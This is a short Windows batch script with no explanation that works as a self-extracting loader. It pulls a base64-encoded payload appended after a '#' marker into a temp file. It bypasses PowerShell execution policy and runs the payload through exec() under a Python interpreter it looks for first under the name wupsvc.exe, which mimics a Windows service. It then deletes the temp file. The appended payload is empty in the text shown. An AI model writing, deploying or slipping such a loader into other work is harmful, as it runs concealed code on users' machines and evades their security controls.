@echo off
setlocal
set "SELF=%~f0"
powershell -ExecutionPolicy Bypass -NoProfile -Command "$s=[Environment]::GetEnvironmentVariable('SELF');$c=Get-Content $s -Raw;$m=$c.LastIndexOf('#');if($m-ge0){$b=$c.Substring($m+1);$f=$env:TEMP+'\pld.dat';$b|Set-Content $f -NoNewline -Encoding Ascii;$env:PLD=$f;$d=$env:LOCALAPPDATA+'\Python312';$w=$d+'\wupsvc.exe';if(Test-Path $w){$p=$w}elseif(Test-Path ($d+'\python.exe')){$p=$d+'\python.exe'}else{exit 1};if(!$p){exit 1};& $p -c ""import os,base64; exec(base64.b64decode(open(os.environ['PLD']).read()))"";Remove-Item $f -Force -EA 0}"
exit /b
#

